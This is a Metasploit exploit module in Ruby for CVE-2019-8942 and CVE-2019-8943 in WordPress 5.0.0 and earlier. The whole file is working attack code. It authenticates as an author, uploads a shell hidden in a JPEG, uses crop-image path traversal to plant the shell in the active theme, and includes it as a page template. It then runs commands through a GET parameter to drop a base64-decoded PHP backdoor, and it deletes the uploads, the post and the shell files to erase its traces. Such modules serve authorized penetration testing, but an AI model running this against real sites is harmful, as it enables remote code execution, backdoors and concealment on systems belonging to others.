##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
  super(update_info(
    info,
    'Name'            => 'WordPress Crop-image Shell Upload',
    'Description'     => %q{
        This module exploits a path traversal and a local file inclusion
        vulnerability on WordPress versions 5.0.0 and <= 4.9.8.
        The crop-image function allows a user, with at least author privileges,
        to resize an image and perform a path traversal by changing the _wp_attached_file
        reference during the upload. The second part of the exploit will include
        this image in the current theme by changing the _wp_page_template attribute
        when creating a post.
    },
    'License'         => MSF_LICENSE,
    'Author'          =>
    [
      'RIPSTECH Technology',                               # Discovery
      'Wilfried Becard <wilfried.becard@synacktiv.com>'    # Metasploit module
    ],
  'References'      =>
    [
      [ 'CVE', '2019-8942' ],
      [ 'CVE', '2019-8943' ],
      [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/']
    ],
    'DisclosureDate'  => 'Feb 19 2019',
    'Platform'        => 'php',
    'Arch'            => ARCH_PHP,
    'Targets'         => [['WordPress', {}]],
    'DefaultTarget'   => 0
  ))

  register_options(
    [
      OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
      OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
    ])
  end

  def check
  cookie = wordpress_login(username, password)
  if cookie.nil?
    store_valid_credential(user: username, private: password, proof: cookie)
    return CheckCode::Safe
  end

  CheckCode::Appears
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def get_wpnonce(cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php')
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri,
      'cookie' => cookie
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      res.get_hidden_inputs.first["_wpnonce"]
    end
  end

  def get_wpnonce2(image_id, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookie,
      'vars_get'  => {
        'post'   => "#{image_id}",
        'action' => "edit"
      }
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      tmp = res.get_hidden_inputs
      wpnonce2 = tmp[1].first[1]
    end
  end

  def get_current_theme
    uri = normalize_uri(datastore['TARGETURI'])
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri
    )
    fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && res.body.length > 0

    theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first
    fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme

    theme
  end

  def get_ajaxnonce(cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'query-attachments',
        'post_id' => '0',
        'query[item]' => '43',
        'query[orderby]' => 'date',
        'query[order]' => 'DESC',
        'query[posts_per_page]' => '40',
        'query[paged]' => '1'
      }
    )
    fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && res.body.length > 0
    a_nonce = res.body.scan(/"edit":"(\w+)"/).flatten.first
    fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce

    a_nonce
  end

  def upload_file(tmp_filename, img_name, wp_nonce, cookie)
    path = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2019-8942", tmp_filename)
    img_data = File.read(path)
    img_name += '.jpg'

    boundary = "#{rand_text_alphanumeric(rand(10) + 5)}"
    post_data = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"name\"\r\n"
    post_data << "\r\n#{img_name}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"action\"\r\n"
    post_data << "\r\nupload-attachment\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"_wpnonce\"\r\n"
    post_data << "\r\n#{wp_nonce}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"async-upload\"; filename=\"#{img_name}\"\r\n"
    post_data << "Content-Type: image/jpeg\r\n"
    post_data << "\r\n#{img_data}\r\n"
    post_data << "--#{boundary}--\r\n"
    print_status("Uploading payload")
    upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')

    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => upload_uri,
      'ctype'    => "multipart/form-data; boundary=#{boundary}",
      'data'     => post_data,
      'cookie'   => cookie
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      print_good("Image uploaded")
      res = JSON.parse(res.body)
      image_id = res["data"]["id"]
      update_nonce = res["data"]["nonces"]["update"]
      filename = res["data"]["filename"]
      return filename, image_id, update_nonce
    end
  end

  def image_editor(img_name, ajax_nonce, image_id, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'image-editor',
        '_ajax_nonce' => ajax_nonce,
        'postid' => image_id,
        'history' => '[{"c":{"x":0,"y":0,"w":400,"h":300}}]',
        'target' => 'all',
        'context' => '',
        'do' => 'save'
      }
    )
    fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && res.body.length > 0
    filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first
    fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename

    filename << '.jpg'
  end

  def change_path(wpnonce2, image_id, filename, current_date, path, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => uri,
      'cookie' => cookie,
      'vars_post'  => {
        '_wpnonce' => wpnonce2,
        'action' => 'editpost',
        'post_ID' => image_id,
        'meta_input[_wp_attached_file]' => "#{current_date}#{filename}#{path}"
      }
    )
  end

  def crop_image(image_id, ajax_nonce, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'crop-image',
        '_ajax_nonce' => ajax_nonce,
        'id' => image_id,
        'cropDetails[x1]' => 0,
        'cropDetails[y1]' => 0,
        'cropDetails[width]' => 400,
        'cropDetails[height]' => 300,
        'cropDetails[dst_width]' => 400,
        'cropDetails[dst_height]' => 300
      }
    )
  end

  def include_theme(shell_name, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php')
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => uri,
      'cookie' => cookie
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      wpnonce2 = res.body.scan(/name="_wpnonce" value="(\w+)"/).flatten.first
      post_id = res.body.scan(/"post":{"id":(\w+),/).flatten.first
      fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id

      post_title = Rex::Text.rand_text_alpha(10)
      uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')
      res = send_request_cgi(
        'method'   => 'POST',
        'uri'      => uri,
        'cookie' => cookie,
        'vars_post'  => {
          '_wpnonce'=> wpnonce2,
          'action' => 'editpost',
          'post_ID' => post_id,
          'post_title' => post_title,
          'post_name' => post_title,
          'meta_input[_wp_page_template]' => "cropped-#{shell_name}.jpg"
        }
      )
      if res && res.code == 302
        post_id
      end
    end
  end

  def wp_cleanup(shell_name, post_id, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'cookie'    => cookie,
      'vars_post'  => {
          'action' => "query-attachments"
      }
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      infos = res.body.scan(/id":(\d+),.*filename":"cropped-#{shell_name}".*?"delete":"(\w+)".*"id":(\d+),.*filename":"cropped-x".*?"delete":"(\w+)".*"id":(\d+),.*filename":"#{shell_name}".*?"delete":"(\w+)"/).flatten
      id1, id2, id3 = infos[0], infos[2], infos[4]
      delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]
      for i in (0...6).step(2)
        res = send_request_cgi(
          'method'    => 'POST',
          'uri'       => uri,
          'cookie'    => cookie,
          'vars_post'  => {
              'action' => "delete-post",
              'id'     => "#{infos[i]}",
              '_wpnonce' => "#{infos[i+1]}"
          }
        )
      end
    end

    uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php')
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri1,
      'cookie'    => cookie
    )

    if res && res.code == 200 && res.body && res.body.length > 0
      post_nonce = res.body.scan(/post=#{post_id}&amp;action=trash&amp;_wpnonce=(\w+)/).flatten.first
      fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce
      uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')

      res = send_request_cgi(
        'method'    => 'GET',
        'uri'       => uri2,
        'cookie'    => cookie,
        'vars_get'  => {
          'post'     => "#{post_id}",
          'action'   => 'trash',
          '_wpnonce' => "#{post_nonce}"
        }
      )

      if res && res.code == 302
        res = send_request_cgi(
          'method'    => 'GET',
          'uri'       => uri1,
          'cookie'    => cookie,
          'vars_get'  => {
            'post_status' => "trash",
            'post_type'   => 'post',
            '_wpnonce' => "#{post_nonce}"
          }
        )

        if res && res.code == 200 && res.body && res.body.length > 0
          nonce = res.body.scan(/post=#{post_id}&amp;action=delete&amp;_wpnonce=(\w+)/).flatten.first
          fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce

          res = send_request_cgi(
            'method'    => 'GET',
            'uri'       => uri2,
            'cookie'    => cookie,
            'vars_get'  => {
              'post'     => "#{post_id}",
              'action'   => 'delete',
              '_wpnonce' => "#{nonce}"
            }
          )
        end
      end
    end
  end

  def exploit
    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

    print_status("Authenticating with WordPress using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
    print_good("Authenticated with WordPress")
    store_valid_credential(user: username, private: password, proof: cookie)

    print_status("Preparing payload...")
    @current_theme = get_current_theme
    wp_nonce = get_wpnonce(cookie)
    tmp_filename = "evilshell.jpg"
    @current_date = Time.now.strftime("%Y/%m/")

    img_name = Rex::Text.rand_text_alpha(10)
    @filename1, image_id, update_nonce = upload_file(tmp_filename, img_name, wp_nonce, cookie)
    ajax_nonce = get_ajaxnonce(cookie)

    @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)
    wpnonce2 = get_wpnonce2(image_id, cookie)

    change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie)
    crop_image(image_id, ajax_nonce, cookie)

    @shell_name = Rex::Text.rand_text_alpha(10)
    change_path(wpnonce2, image_id, @filename1, @current_date, "?/../../../../themes/#{@current_theme}/#{@shell_name}", cookie)
    crop_image(image_id, ajax_nonce, cookie)

    print_status("Including into theme")
    post_id = include_theme(@shell_name, cookie)
    uri = normalize_uri(datastore['TARGETURI'])
    # Test if base64 is on target
    test_string = 'YmFzZTY0c3BvdHRlZAo='
    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => uri,
      'cookie' => cookie,
      'vars_get' => {
        'p' => "#{post_id}",
        '0' => "echo #{test_string} | base64 -d"
      }
    )
    if res && res.code == 200 && res.body && res.body.length > 0
      if res.body.include?("base64spotted")
        # Execute payload with base64 decode
        @backdoor = Rex::Text.rand_text_alpha(10)
        encoded = Rex::Text.encode_base64(payload.encoded)
        res = send_request_cgi(
          'method'   => 'GET',
          'uri'      => uri,
          'cookie' => cookie,
          'vars_get' => {
            'p' => "#{post_id}",
            '0' => "echo #{encoded} | base64 -d > #{@backdoor}.php"
          }
        )
        if res && res.code == 200 && res.body && res.body.length > 0
          uri = normalize_uri(datastore['TARGETURI'], "#{@backdoor}.php")
          res = send_request_cgi(
            'method'   => 'GET',
            'uri'      => uri,
            'cookie' => cookie
          )
        end
      else
        print_status("Can't find base64 decode on target.")
      end
    end
    wp_cleanup(@shell_name, post_id, cookie)
  end

  def on_new_session(client)
    client.shell_command_token("rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*")
    client.shell_command_token("rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*")
    client.shell_command_token("rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*")
    client.shell_command_token("rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg")
    client.shell_command_token("rm #{@backdoor}.php")
  end
end
